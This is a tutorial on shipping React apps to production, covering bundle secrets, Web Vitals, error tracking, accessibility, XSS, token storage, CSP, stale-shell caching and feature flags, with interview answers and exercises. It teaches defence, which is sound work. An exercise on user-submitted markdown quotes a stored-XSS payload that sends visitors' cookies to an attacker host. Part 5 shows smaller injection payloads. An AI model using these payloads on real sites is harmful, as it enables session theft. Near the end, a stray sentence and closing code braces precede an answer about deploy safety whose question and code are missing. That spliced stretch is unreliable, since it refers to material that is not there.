Production Patterns Full-Stack React

What you'll master: what a production build actually changes and why a development build in production is a security problem, not just a slow one; why anything in a client bundle is public — including the build-time variable someone put a real secret in; Core Web Vitals with real thresholds and the React-specific cause of each, and why lab numbers systematically flatter you; error tracking that is actually readable; the accessibility floor — focus on route change, announced navigation, modal focus traps, and why <div onClick> is invisible to a screen reader; XSS, token storage and CSP; the stale-index.html problem; and feature flags with a rollback you have actually tested. Prerequisites: Next.js Essentials, Code Splitting.

Part 1 — The Production Build, and Why Your Bundle Is Public

  A PRODUCTION BUILD IS NOT "THE SAME CODE, SMALLER". Four things change:

    1. NODE_ENV === "production"
       React ships two code paths. The development path carries prop-type
       checks, key warnings, hook-order validation, the "cannot update
       state on an unmounted component" family, and readable component
       names in errors. All of it is stripped.

    2. MINIFICATION AND MANGLING
       Names shortened, whitespace removed, expressions folded.
       Component names become "a", "Wr", "t3" — which is exactly why
       source maps matter for error tracking.

    3. DEAD-CODE ELIMINATION
       if (process.env.NODE_ENV !== "production") { ... } becomes
       if (false) { ... } and is then removed entirely, along with
       anything only it referenced.

    4. CONTENT HASHING
       main.a3f9c2.js — the filename changes when the content does. This
       is what makes long cache lifetimes safe, and it sets up the
       stale-shell problem in Part 6.

  A DEVELOPMENT BUILD IN PRODUCTION IS ROUGHLY 2-3x LARGER AND SLOWER,
  and it also leaks: full component names, file paths, sometimes internal
  comments. React logs a console warning if you ship one — but nobody
  reads production consoles, so check the bundle, not the console.
  THE SINGLE MOST EXPENSIVE MISUNDERSTANDING IN FRONT-END DEPLOYMENT:

  ANYTHING THAT REACHES THE CLIENT BUNDLE IS PUBLIC. Not obscure. Not
  hard to find. PUBLIC — sitting in a text file any visitor can read.

    // .env
    VITE_API_URL=https://api.example.com          fine
    VITE_STRIPE_KEY=pk_live_...                   fine, publishable
    VITE_STRIPE_SECRET=sk_live_...                CATASTROPHIC
    NEXT_PUBLIC_DB_PASSWORD=hunter2               CATASTROPHIC

  The build tool INLINES these as literal strings:

    const key = process.env.VITE_STRIPE_SECRET;
    // becomes, in main.a3f9c2.js:
    const key = "sk_live_51H8xK2...";

  Finding it takes one Ctrl-F. Bots scan public bundles for exactly these
  patterns, continuously.

  THE PREFIX IS A SAFETY RAIL, NOT A SECRET STORE. VITE_ and
  NEXT_PUBLIC_ exist to make exposure DELIBERATE — the prefix means "I
  understand this ships to browsers". Variables without the prefix are
  server-only precisely because they are not inlined.

  THE RULE: A SECRET LIVES ON A SERVER. If the browser needs to do
  something privileged, it calls YOUR backend, which holds the key. There
  is no build-time trick that makes a client secret safe — not
  obfuscation, not base64, not splitting it across variables.

  IF ONE LEAKS, ROTATE IT. Do not merely remove it: it is in your git
  history, in every user's browser cache, in any CDN that cached the
  bundle, and possibly in an archive. Removal changes nothing.

  SOURCE MAPS: SHIP OR NOT?

    PUBLIC source maps      anyone can read your original source. Fine
                            for open source, a business decision
                            otherwise. They do not create a
                            vulnerability — minified code is not
                            security — but they remove friction.

    UPLOAD, DO NOT SERVE    the usual answer: generate maps, upload them
                            to your error tracker at build time, and do
                            not deploy the .map files. You get readable
                            stack traces; the public gets minified code.

      // vite.config.js
      build: { sourcemap: true }      // then upload and delete from dist

  NEVER ship maps for a bundle that once contained a secret — the map
  makes it trivially greppable even after you have rotated.

Part 2 — Web Vitals, Budgets, and Why Lab Numbers Lie

  THREE METRICS CARRY MOST OF THE WEIGHT. Google's thresholds, measured
  at the 75TH PERCENTILE of real users:

    METRIC                          GOOD      NEEDS WORK      POOR
    ------------------------------------------------------------------
    LCP  Largest Contentful Paint   ≤2.5s     2.5-4.0s        >4.0s
    INP  Interaction to Next Paint  ≤200ms    200-500ms       >500ms
    CLS  Cumulative Layout Shift    ≤0.1      0.1-0.25        >0.25

  INP REPLACED FID IN MARCH 2024, and the change matters. FID measured
  only the delay before the FIRST interaction's handler started — it
  ignored how long the handler ran and when the result was painted. Most
  sites scored well on FID while feeling slow. INP measures the FULL
  latency, input to next paint, across ALL interactions, and reports
  roughly the worst. It is far harder to game, and many sites that passed
  FID comfortably fail INP.

  THE REACT-SPECIFIC CAUSE OF EACH:

    LCP   too much JavaScript before first paint; client-only rendering
          of above-the-fold content; a hero image discovered late
          because it is rendered by JS rather than present in the HTML.
          FIX: SSR or pre-render the shell, route-split, preload the
          hero, trim the critical bundle.

    INP   a long synchronous render in a handler — filtering thousands
          of rows, an unmemoised expensive subtree, a context provider
          whose value changes on every keystroke and re-renders half the
          app. FIX: render less (virtualise), fix state placement, then
          useTransition. Also check for a slow third-party script
          hogging the main thread.

    CLS   content injected above existing content after paint — a banner,
          an ad slot, a late-loading font, and above all IMAGES WITHOUT
          DIMENSIONS. In React, also: a Suspense fallback whose size
          differs from the content that replaces it.
          FIX: width/height or aspect-ratio on every image, reserve
          space for injected elements, and make skeletons the same
          shape as the real content.
  LAB VERSUS FIELD, AND WHY LAB NUMBERS FLATTER YOU.

    LAB (Lighthouse, WebPageTest, CI)
      one synthetic device, one network profile, a cold cache, no
      extensions, no other tabs, and usually a fast machine in a data
      centre near your origin.

    FIELD / RUM (real users)
      every device from a flagship to a four-year-old budget Android,
      every network, warm and cold caches, ad blockers, a browser with
      forty tabs open, and users on the other side of the world.

  LAB IS REPRODUCIBLE AND CATCHES REGRESSIONS. FIELD IS THE TRUTH. Ship
  both, and treat a disagreement as information about your user base
  rather than as noise.

    import { onLCP, onINP, onCLS } from "web-vitals";

    function send(metric) {
      navigator.sendBeacon("/api/vitals", JSON.stringify({
        name: metric.name,
        value: metric.value,
        rating: metric.rating,          // good | needs-improvement | poor
        id: metric.id,
        path: location.pathname,
      }));
    }
    onLCP(send); onINP(send); onCLS(send);

  sendBeacon SURVIVES PAGE UNLOAD, which a fetch generally does not —
  and CLS and INP are only final when the page goes away, so this is not
  a stylistic choice.

  ALWAYS LOOK AT p75 AND p95, NEVER THE MEAN. Averages hide the users
  having the worst time, and those are the ones who leave.

  A BUDGET IS ONLY REAL IF CI ENFORCES IT:

    # fail the build if the initial bundle grows past 170KB gzipped
    - run: npx bundlesize
    - run: npx lhci autorun --assert.preset=lighthouse:recommended

  I18N IS A COMMON, INVISIBLE BUDGET LEAK. The naive approach imports
  every locale into the main bundle:

    import en from "./locales/en.json";     // shipped to everyone
    import de from "./locales/de.json";     // ...including the 90% who
    import ja from "./locales/ja.json";     //    will never see them

  Load the active locale dynamically instead, and prefer built-in Intl
  for dates, numbers and plurals — it costs zero bytes and handles rules
  a hand-rolled helper gets wrong.

Part 3 — Error Tracking You Can Actually Read

  A PRODUCTION STACK TRACE WITHOUT SOURCE MAPS IS USELESS:

    TypeError: Cannot read properties of undefined (reading 'name')
        at t (main.a3f9c2.js:1:48211)
        at Wr (main.a3f9c2.js:1:92034)

  WITH THE MAP UPLOADED AND THE RELEASE TAGGED:

    TypeError: Cannot read properties of undefined (reading 'name')
        at UserCard (src/components/UserCard.tsx:24:18)
        at ProfilePage (src/pages/Profile.tsx:61:7)

  THE RELEASE TAG IS THE PART PEOPLE FORGET. Maps are per-build. Without
  a release identifier the tracker cannot match a trace from build 412 to
  the maps from build 412, and you get minified frames anyway:

    Sentry.init({
      dsn: process.env.VITE_SENTRY_DSN,
      release: process.env.VITE_COMMIT_SHA,     // MUST match the upload
      environment: process.env.VITE_ENV,
      tracesSampleRate: 0.1,          // 10% of transactions
      replaysOnErrorSampleRate: 1.0,  // every session that errored
      beforeSend(event) {
        // never ship PII to a third party
        delete event.request?.cookies;
        return event;
      },
    });

  SAMPLING IS A COST AND SIGNAL DECISION, NOT ONLY A BILLING ONE:

    ERRORS          capture 100%. They are rare and each one matters.
    TRACES          5-20%. Performance is statistical; you do not need
                    every transaction to see a p75 move.
    SESSION REPLAY  0% baseline, 100% on error. Replaying every session
                    is expensive and mostly uninteresting.

  ERROR BOUNDARIES ARE THE REACT-SPECIFIC HALF. Without one, a render
  error unmounts the entire tree and the user gets a white screen:

    <ErrorBoundary fallback={<AppCrashed />}>          {/* root: last resort */}
      <Layout>
        <ErrorBoundary fallback={<PageError />}>      {/* per route */}
          <Route />
        </ErrorBoundary>
      </Layout>
    </ErrorBoundary>

  BOUNDARIES DO NOT CATCH: event handler errors, async errors (a promise
  rejection in an effect), errors during SSR, or errors thrown inside the
  boundary itself. Add window.onerror and onunhandledrejection handlers
  to cover the rest — otherwise a whole class of failure is invisible to
  you while being extremely visible to users.

Part 4 — The Accessibility Floor

  THIS IS A FLOOR, NOT A NICE-TO-HAVE. In many jurisdictions it is also a
  legal requirement, and every item below is cheap if done while
  building and expensive to retrofit.

  1. A CLICKABLE DIV IS INVISIBLE TO ASSISTIVE TECHNOLOGY.

    <div onClick={save} className="btn">Save</div>

    A screen reader announces this as a group of text, with no role and
    no indication it does anything. It is not focusable, so a keyboard
    user cannot reach it. Enter and Space do nothing. There is no
    disabled state, no form submission, no focus ring.

    <button type="button" onClick={save}>Save</button>

    The native element gives you role, focusability, keyboard activation,
    disabled semantics and platform focus styling — free, and correct on
    devices you have never tested. THE SAME APPLIES TO <a href> FOR
    NAVIGATION: a div that routes on click breaks middle-click,
    open-in-new-tab, copy-link and screen readers simultaneously.

    If you genuinely must use a div, you owe it FOUR attributes and a
    key handler — which is a good argument for just using the button:

      role="button" tabIndex={0}
      onKeyDown={e => (e.key === "Enter" || e.key === " ") && save()}
      aria-disabled={busy}
  2. FOCUS AND ANNOUNCEMENT ON ROUTE CHANGE.

    A full page load moves focus to the top of the new document and the
    screen reader announces the new title. CLIENT ROUTING DOES NEITHER.
    Focus stays wherever it was — often on a link that no longer exists,
    which sends it to <body> — and nothing is announced, so a
    non-sighted user has no idea the page changed.

      function RouteAnnouncer() {
        const { pathname } = useLocation();
        const ref = useRef(null);
        const [message, setMessage] = useState("");

        useEffect(() => {
          document.title = titleFor(pathname);
          setMessage(`Navigated to ${titleFor(pathname)}`);
          ref.current?.focus();          // move focus into the new page
        }, [pathname]);

        return (
          <>
            <div ref={ref} tabIndex={-1} />   {/* focus target, not tabbable */}
            <div aria-live="polite" className="sr-only">{message}</div>
          </>
        );
      }

    tabIndex={-1} makes an element PROGRAMMATICALLY focusable without
    inserting it into the tab order — the standard pattern for this.

  3. MODALS MUST TRAP FOCUS AND RESTORE IT.

    Without a trap, Tab walks out of the dialog into the page behind it,
    which the sighted user cannot see and the screen-reader user cannot
    make sense of. On close, focus must return to the element that opened
    the dialog or the keyboard user is dumped at the top of the document.

    THE NATIVE ELEMENT DOES ALL OF THIS:

      <dialog ref={ref}>...</dialog>
      ref.current.showModal();   // traps focus, Escape closes,
                                 // background is inert, focus restored

    Use it before reaching for a library. If you build your own, you owe:
    focus moved in on open, Tab cycling within, Escape closing, focus
    restored on close, aria-modal and a label, and the background marked
    inert.

  4. THE REST OF THE FLOOR.

      - visible focus indicators; never `outline: none` without a
        replacement
      - a skip-to-content link as the first focusable element
      - form inputs with real <label htmlFor>, and errors linked via
        aria-describedby and announced
      - 4.5:1 contrast for body text, 3:1 for large text and UI borders
      - alt text on meaningful images, alt="" on decorative ones
      - respect prefers-reduced-motion
      - one <h1> per page and no skipped heading levels

Part 5 — Security: XSS, Tokens, CSP, Dependencies

  REACT ESCAPES BY DEFAULT, which prevents most XSS automatically:

    <p>{userInput}</p>
    // "<img src=x onerror=alert(1)>" renders as literal TEXT

  THERE ARE EXACTLY THREE WAYS TO BREAK THAT, and all three are
  deliberate:

    1. dangerouslySetInnerHTML

       <div dangerouslySetInnerHTML={{ __html: comment.body }} />

       The name is a warning label. If comment.body is user-supplied,
       you have shipped stored XSS — the attacker's script runs for every
       viewer, with their session. SANITISE FIRST, ALWAYS:

         import DOMPurify from "dompurify";
         <div dangerouslySetInnerHTML={{
           __html: DOMPurify.sanitize(comment.body)
         }} />

       Sanitise at RENDER time, not only on save: a sanitiser bug fixed
       upstream should protect your existing rows too.

    2. javascript: URLs

       <a href={user.website}>   // "javascript:fetch('/api/keys')..."

       React warns but historically has not blocked every variant.
       Validate the protocol yourself:

         const safe = /^https?:\/\//i.test(url) ? url : "#";

    3. INJECTING INTO A SCRIPT TAG OR STYLE during SSR — the classic
       being window.__STATE__ = ${JSON.stringify(data)}, where a value
       containing </script> escapes the tag. Serialise with a library
       that escapes it, or escape < yourself.
  TOKEN STORAGE. localStorage IS A BAD DEFAULT FOR AUTH TOKENS:

    JAVASCRIPT CAN READ IT. That is the whole issue. Any XSS anywhere —
    your code, a dependency, an analytics snippet, a compromised CDN —
    exfiltrates the token in one line, and a stolen token is valid until
    it expires no matter what the user does.

    localStorage.getItem("token")   // one line, from any script

  THE BETTER DEFAULT IS AN httpOnly COOKIE:

    Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/

    HttpOnly    JavaScript cannot read it — XSS cannot steal it
    Secure      HTTPS only
    SameSite    Lax blocks the common CSRF vectors; use Strict where the
                UX allows, and if you need None you MUST add CSRF tokens

  THE HONEST TRADE-OFF: cookies are sent automatically, which is what
  creates CSRF exposure in the first place; localStorage is immune to
  CSRF but exposed to XSS. The reason httpOnly cookies win as a default
  is that CSRF has a complete, well-understood mitigation (SameSite plus
  a token), whereas XSS token theft has none once it happens. A common
  production pattern is a short-lived access token in memory plus a
  long-lived refresh token in an httpOnly cookie.

  CONTENT SECURITY POLICY is defence in depth — it limits the damage when
  something does get injected:

    Content-Security-Policy:
      default-src 'self';
      script-src 'self' 'nonce-{random}';
      object-src 'none';
      base-uri 'self';
      frame-ancestors 'none'

  AVOID 'unsafe-inline' IN script-src — it disables most of the value.
  Use per-request nonces. Roll out with
  Content-Security-Policy-Report-Only first and read the reports, because
  a strict policy will break something you forgot about.

  DEPENDENCIES ARE YOUR ATTACK SURFACE. A typical React app has 800-1500
  transitive packages, every one of which runs with your privileges:

    npm audit --production        # advisories that reach production
    npm ci                        # lockfile-exact installs
    # Dependabot/Renovate, and pin GitHub Actions to a commit SHA

  Prefer fewer, larger, well-maintained dependencies over many small
  ones, and treat "unmaintained for two years" as a security signal
  rather than a stability one.

Part 6 — Caching, the Stale Shell, Flags, and the Checklist

  THE CACHING STRATEGY IS TWO RULES:

    HASHED ASSETS      main.a3f9c2.js, styles.7b21e4.css
                       Cache-Control: public, max-age=31536000, immutable
                       Safe forever — a change produces a NEW filename.

    THE HTML SHELL     index.html
                       Cache-Control: no-cache
                       MUST be revalidated, because it is what points at
                       the hashed filenames.

  THE STALE index.html PROBLEM, WHICH BITES EVERY TEAM ONCE:

    1. A user loads the app. index.html references main.a3f9c2.js.
    2. index.html is cached for an hour (a CDN default, or a
       well-meaning max-age).
    3. You deploy. The new shell references main.9d1b77.js.
       The old chunks are deleted from the bucket.
    4. The user reloads within the hour and gets the CACHED shell,
       which requests main.a3f9c2.js — now 404.

       RESULT: a white screen, and "it works for me" from everyone whose
       cache already expired.

    THE SAME FAILURE HITS AN OPEN TAB WITH LAZY ROUTES: the user has the
    old shell in memory, clicks through to a route whose chunk was
    deleted, and import() rejects.

  THREE THINGS THAT TOGETHER FIX IT:

    a) no-cache ON THE SHELL. Not no-store — no-cache still allows a
       304, so it is cheap; it just forbids using a copy without asking.

    b) KEEP OLD CHUNKS FOR A WHILE. Do not purge on deploy. They are
       small, they are content-hashed so they never collide, and a
       48-hour overlap covers open tabs. This is the step most people
       skip.

    c) HANDLE A FAILED CHUNK LOAD. Detect it and reload once:

       window.addEventListener("vite:preloadError", () => {
         if (!sessionStorage.getItem("chunk-reload")) {
           sessionStorage.setItem("chunk-reload", "1");
           location.reload();
         }
       });

       The sessionStorage guard prevents a reload loop if the chunk is
       genuinely gone rather than merely stale.
  FEATURE FLAGS AND PROGRESSIVE ROLLOUT. Deploying and releasing should
  be separate events:

    const flags = useFlags();
    return flags.newCheckout ? <CheckoutV2 /> : <CheckoutV1 />;

    ROLLOUT:  internal -> 1% -> 5% -> 25% -> 50% -> 100%
              watching error rate, INP and conversion at each step

  THREE RULES THAT KEEP FLAGS FROM BECOMING THE PROBLEM:

    NEVER GATE AUTHORISATION ON A CLIENT FLAG. The flag decides what to
    RENDER, never what is PERMITTED — a user can flip any client value.
    The server authorises, every time, independently.

    DEFAULT TO OFF WHEN THE FLAG SERVICE FAILS. A flag provider outage
    should degrade to the known-good path, not to whatever the SDK
    returns on error.

    DELETE FLAGS AFTER FULL ROLLOUT. Every stale flag doubles a code
    path and the combinations multiply. Put an expiry date on each one
    when you create it.

  ROLLBACK IS THE PLAN THAT MATTERS MOST AND IS TESTED LEAST:

    fastest   turn the flag off              seconds, no deploy
    fast      re-point the CDN to the previous build   ~1 minute
    slow      revert the commit and rebuild   full pipeline

  IF YOU HAVE NEVER PERFORMED A ROLLBACK, YOU DO NOT HAVE ONE. Rehearse
  it during a quiet hour, not during the incident.

Interview Questions

Beginner: What does a production build change, and why does it matter?

Four things. NODE_ENV becomes "production", which strips React's development-only code — prop-type checks, key warnings, hook-order validation and readable component names. The code is minified and identifiers mangled. Dead code is eliminated, so anything behind a NODE_ENV !== "production" check is removed entirely. And assets get content hashes in their filenames.

It matters for size and speed — a development build is roughly two to three times larger and slower, since every render carries validation work. It also matters for information disclosure: a development build exposes full component names, file paths and sometimes comments.

The practical check is to inspect the built output rather than trusting the pipeline, because React's console warning about development builds is easy to miss — nobody reads production consoles.

Beginner: Why is <div onClick> a problem, and what does <button> give you?

A div has no semantic role, so a screen reader announces it as plain text with no indication it is interactive. It is not in the tab order, so keyboard users cannot reach it at all. Enter and Space do nothing, since those are button behaviours the browser provides only for real buttons. There is no disabled state and no default focus ring.

<button> supplies all of that natively: the button role, focusability, keyboard activation, disabled semantics, form submission where relevant, and platform-appropriate focus styling that works on devices you have never tested.

The same applies to navigation. A div that routes on click also breaks middle-click, open-in-new-tab and copy-link-address, because those never fire a click handler — use <a href>. If you truly must use a div, you owe it role="button", tabIndex={0}, a key handler for Enter and Space, and aria-disabled, which is a good argument for just using the button.

Mid: INP replaced FID. What changed, and what causes bad INP in React?

FID measured only the delay between a user's first interaction and the moment its handler began running. It ignored how long the handler took and when the result was actually painted, and it sampled one interaction per page. Most sites passed it comfortably while still feeling slow, so it was a weak proxy.

INP measures the full latency from input to the next paint, across all interactions in the session, reporting approximately the worst. Good is 200ms or under at the 75th percentile. Because it captures processing and rendering rather than just queueing, it is much harder to game, and plenty of sites that passed FID fail INP.

In React the usual causes are a long synchronous render triggered by a handler — filtering thousands of rows, an expensive unmemoised subtree, or a context provider whose value changes on every keystroke and re-renders a large part of the app. The fix order is render less, then render less often, then reschedule: virtualise or paginate, correct state placement, then reach for useTransition. I would also check for a third-party script monopolising the main thread, which is frequently the real culprit and has nothing to do with your code.

Mid: Users see a white screen after a deploy but it works in incognito. What happened?

Almost certainly the stale index.html problem. The HTML shell was cached — commonly by a CDN default or a well-intentioned max-age — so a returning user gets the old shell, which references the previous build's hashed chunk filenames. If those files were purged on deploy, the requests 404 and nothing renders. Incognito works because it has no cache and fetches the current shell.

The same failure hits an open tab: the user has the old shell in memory, clicks through to a lazily loaded route, and the dynamic import rejects because that chunk is gone.

Three fixes together. Serve the shell with no-cache so it is always revalidated — that still permits a cheap 304, unlike no-store. Stop purging old chunks on deploy: they are small, content-hashed so they never collide, and a 48-hour overlap covers open tabs. That is the step most teams skip. And handle a failed chunk load by reloading once, guarded with sessionStorage so a genuinely missing chunk does not cause a reload loop. Hashed assets themselves can safely be immutable with a one-year max-age, because a change produces a new filename.

Senior: Where do you store an auth token in a React app, and defend the trade-off.

My default is an httpOnly, Secure, SameSite cookie, with a short-lived access token held in memory and a long-lived refresh token in the cookie.

The case against localStorage is that JavaScript can read it. That is not a theoretical concern in an app with a thousand transitive dependencies, a tag manager and a third-party analytics snippet — any XSS anywhere on the origin exfiltrates the token in a single line, and a stolen bearer token stays valid until it expires regardless of what the user does. An httpOnly cookie is unreadable from JavaScript, so the same XSS cannot steal it. The attacker can still make requests as the user while the page is open, which matters, but they cannot walk away with a credential.

The honest counterpoint is that cookies are attached automatically, which is precisely what creates CSRF exposure — a risk localStorage does not have. I still prefer cookies because CSRF has a complete, well-understood mitigation: SameSite=Lax blocks the common vectors, and where cross-site requests are genuinely required you add a synchroniser token. XSS token theft has no comparable mitigation after the fact. Given a choice between a solved problem and an unsolved one, take the solved one.

Cookies also cost something operationally — they complicate cross-domain APIs and mobile clients, which is often the real reason teams reach for localStorage. If that constraint is genuine I would keep the access token in memory only, make it short-lived, and accept re-authentication on refresh rather than persisting it where scripts can read it. And regardless of storage, a CSP that meaningfully constrains script sources is the layer that reduces the chance of ever needing this argument.

Senior: You are launching a React app to real users next week. What is your checklist, in priority order?

I sort by what causes irreversible damage, then by what makes the app unusable, then by what I can only learn from production.

Irreversible first: secrets. I grep the built bundle for sk_, secret and password, because an exposed key is the one mistake you cannot take back — it is in caches, CDNs and git history, so the response is rotation, not deletion. Alongside it, security basics: every dangerouslySetInnerHTML sanitised at render time, tokens in httpOnly cookies, a CSP deployed report-only first so I can read what it would have blocked, and npm audit clean for production dependencies.

Then what breaks the app for everyone. Caching is top of this list because it is the classic launch-week outage: no-cache on index.html, immutable on hashed assets, old chunks retained for at least 48 hours, and a guarded single reload on a failed dynamic import. A verified production build, budgets enforced in CI, and an error boundary per route plus a root fallback — with window.onerror and onunhandledrejection wired, since boundaries catch neither.

Then the accessibility floor, which is both a legal exposure and vastly cheaper now than retrofitted: a keyboard-only pass through the main flows, route changes moving focus and announcing via a live region, modals trapping and restoring focus, and contrast checked. A tab-through of the primary journey catches most of it in ten minutes.

Then observability, because it is what tells me about everything I got wrong. Source maps uploaded with the release tagged to the commit SHA, errors captured at 100% and traces sampled, RUM reporting LCP, INP and CLS at p75 with alerting on regression. Lab numbers go in CI to catch regressions, but I trust the field data.

Finally, the ability to undo. The new path behind a feature flag with a staged rollout, a documented rollback, and — the part that is almost always skipped — a rehearsal of that rollback while nothing is on fire. If you have never performed a rollback, you do not have one.

1 (easy): Find and fix the problem.

  // .env.production
  VITE_API_URL=https://api.example.com
  VITE_SENDGRID_API_KEY=SG.x8Kd93...

  // src/email.js
  export const sendWelcome = (to) =>
    fetch("https://api.sendgrid.com/v3/mail/send", {
      headers: { Authorization: `Bearer ${import.meta.env.VITE_SENDGRID_API_KEY}` },
      ...
    });
Solution 
  // client — calls YOUR backend, no key involved
  export const sendWelcome = (to) =>
    fetch("/api/send-welcome", {
      method: "POST",
      body: JSON.stringify({ to }),
    });

  // server — the key never leaves the machine
  app.post("/api/send-welcome", requireAuth, async (req, res) => {
    await sendgrid.send({ to: req.body.to, /* ... */ });  // process.env, no VITE_
    res.sendStatus(204);
  });

The VITE_ prefix instructs the bundler to inline the value into the client bundle as a literal string, so the SendGrid key ships in a public JavaScript file. Anyone can read it with view-source and Ctrl-F, and bots scan public bundles for exactly this pattern continuously. The result is someone else sending mail on your account and your domain's sending reputation being destroyed.

The prefix is a safety rail, not a vault — it exists to make exposure deliberate. Any privileged call belongs behind your own endpoint, which holds the key server-side and, note, also authorises the request. Proxying without requireAuth would just make your endpoint the open relay instead.

If this has already shipped, rotating the key is the first step and removing it from the code is the second. The old key is in git history, in users' browser caches and in any CDN copy — deleting the line changes nothing about its validity.

2 (easy): This scores well in Lighthouse but users complain the page "jumps while loading". What is wrong?

  <img src={product.image} alt={product.name} className="product-img" />

  /* .product-img { width: 100%; } */
Solution 
  <img
    src={product.image}
    alt={product.name}
    width={800}
    height={600}
    className="product-img"
  />

  /* .product-img { width: 100%; height: auto; aspect-ratio: 4 / 3; } */

Without intrinsic dimensions the browser reserves no space for the image, so it lays the page out with the image at zero height and reflows everything below once the file arrives. That is Cumulative Layout Shift, and images without dimensions are typically the largest single contributor to it.

Supplying width and height lets the browser compute the aspect ratio and reserve the box before the bytes arrive; height: auto in CSS keeps it responsive while preserving that ratio. aspect-ratio covers the case where you cannot know the pixel dimensions in advance.

It scores well in the lab because Lighthouse runs on a fast connection where images arrive almost immediately, leaving little time for a visible shift. Real users on slower networks see the jump clearly — which is a compact illustration of why field data is the truth and lab data only catches regressions.

3 (medium): A screen-reader user reports that after clicking a nav link "nothing seems to happen". The URL and content do change. Diagnose and fix.

Solution 
  function RouteAnnouncer() {
    const { pathname } = useLocation();
    const focusRef = useRef(null);
    const [message, setMessage] = useState("");

    useEffect(() => {
      const title = titleFor(pathname);
      document.title = title;              // browser/tab + some ATs
      setMessage(`Navigated to ${title}`); // announced via live region
      focusRef.current?.focus();           // move focus into the new page
    }, [pathname]);

    return (
      <>
        <div ref={focusRef} tabIndex={-1} />
        <div aria-live="polite" aria-atomic="true" className="sr-only">
          {message}
        </div>
      </>
    );
  }

A full page load gives assistive technology two signals for free: focus resets to the top of the new document, and the new title is announced. Client-side routing provides neither. React swaps the DOM, but focus stays where it was — and if the focused link was removed in the swap, focus falls to <body>, which is why the next Tab press starts from the very beginning of the page. Nothing is announced, so a non-sighted user has no evidence anything changed.

Moving focus to a tabIndex={-1} element inside the new page fixes navigation order — -1 makes an element programmatically focusable without adding it to the tab sequence, which is the standard pattern here. The polite live region announces the change without interrupting whatever is currently being read, and aria-atomic ensures the whole message is spoken rather than only the changed words.

This is worth testing with an actual screen reader — VoiceOver on macOS or NVDA on Windows — because it is the kind of defect that is invisible to every automated checker while making the app unusable.

4 (medium): A comment feature renders user-submitted markdown. Assess the risk and fix it.

  function Comment({ comment }) {
    return <div dangerouslySetInnerHTML={{ __html: marked(comment.body) }} />;
  }
Solution 
  import DOMPurify from "dompurify";

  function Comment({ comment }) {
    const html = useMemo(
      () => DOMPurify.sanitize(marked(comment.body), {
        ALLOWED_TAGS: ["p","strong","em","a","code","pre","ul","ol","li","blockquote"],
        ALLOWED_ATTR: ["href","title"],
      }),
      [comment.body]
    );
    return <div dangerouslySetInnerHTML={{ __html: html }} />;
  }

This is stored XSS, which is the more damaging variety. Most markdown renderers pass raw HTML through by default, so a comment containing <img src=x onerror="fetch('https://evil.tld?c='+document.cookie)"> executes for every visitor who loads the thread, with that visitor's session. It is persisted, so it fires repeatedly without the attacker doing anything further.

Sanitising with an explicit allowlist is the fix. Restricting tags and attributes rather than relying on defaults means a renderer feature you did not anticipate cannot introduce a hole. Sanitise at render time rather than only on save, so that when DOMPurify patches a bypass your existing rows are protected too — content sanitised at save time keeps whatever was stored under the older, weaker rules.

Two things worth adding in review: href still needs protocol validation, since javascript: URLs are a separate vector, and a CSP without 'unsafe-inline' limits the damage if a bypass is ever found. Defence in depth matters here because sanitiser bypasses are discovered periodically.

The Lighthouse score is not contradictory — it is the expected discrepancy.     }
  });

Three properties make a deploy safe mid-session. Assets go up before the shell, so there is never a window where the new index.html references files that have not finished uploading. Old chunks are never purged, because a user with the previous shell in an open tab will request them when they navigate to a lazy route — they are small, and content hashing means they can never collide with the new ones. And only the shell is invalidated at the CDN, since hashed assets are immutable by construction.

The client-side guard covers the residual case where a chunk genuinely is gone — after the retention window, or during a rollback. Reloading once picks up the current shell; the sessionStorage flag prevents an infinite reload loop when the chunk is missing for a reason a reload cannot fix.

For rollback I want three tiers with very different costs. A feature flag turned off is seconds and needs no deploy, which is why significant changes ship behind one and deploying stays separate from releasing. Re-pointing the shell to the previous build's index.html takes about a minute and works precisely because the old chunks were never deleted — this is the tier that retention buys. Reverting the commit and rebuilding is the slow path and should be the fallback, not the plan.

I would rehearse tier two during a quiet period. An untested rollback is not a rollback, and discovering that the old chunks were purged by a lifecycle rule is not something you want to learn during an incident.

🎯 Key Takeaways

  • Anything in the client bundle is public — build tools inline env vars as literal strings, and bots scan public bundles for key patterns continuously.
  • A leaked key must be rotated, not deleted; it survives in git history, browser caches and CDN copies.
  • VITE_/NEXT_PUBLIC_ are safety rails, not vaults — they make exposure deliberate; privileged calls go through your own backend.
  • Generate source maps, upload them, do not serve them — and tag the release with the commit SHA or traces cannot be symbolicated.
  • INP replaced FID in March 2024 and measures full input-to-paint latency across all interactions, so sites that passed FID routinely fail it.
  • Lab data catches regressions; field data is the truth — and always read p75 and p95, never the mean.
  • Images without dimensions are usually the largest CLS contributor, and a Suspense fallback of the wrong size is the React-specific version.
  • Importing every locale ships translations nobody reads; load the active locale dynamically and use Intl for dates, numbers and plurals.
  • Error boundaries do not catch handler errors, async rejections or SSR errors — wire window.onerror and onunhandledrejection too.
  • Sample errors at 100% and traces at 5-20%; replay on error only.
  • A <div onClick> is invisible to screen readers and unreachable by keyboard — the native element supplies role, focus, keyboard activation and disabled state free.
  • Client routing breaks focus and announcement; move focus to a tabIndex={-1} target and announce via an aria-live region.
  • Native <dialog> traps focus, closes on Escape and restores focus — reach for it before a modal library.
  • Sanitise dangerouslySetInnerHTML at render time with an allowlist, so an upstream sanitiser fix protects rows you stored earlier.
  • An httpOnly cookie beats localStorage for tokens because CSRF has a complete mitigation and XSS token theft does not.
  • Cache hashed assets forever and the HTML shell never — the stale shell requesting deleted chunks is the classic white-screen deploy.
  • Never purge old chunks on deploy; a 48-hour overlap is what keeps open tabs alive and makes a fast rollback possible.
  • Feature flags decide rendering, never authorisation, must default to off when the flag service fails, and need an expiry date.
  • If you have never performed a rollback, you do not have one — rehearse it while nothing is on fire.
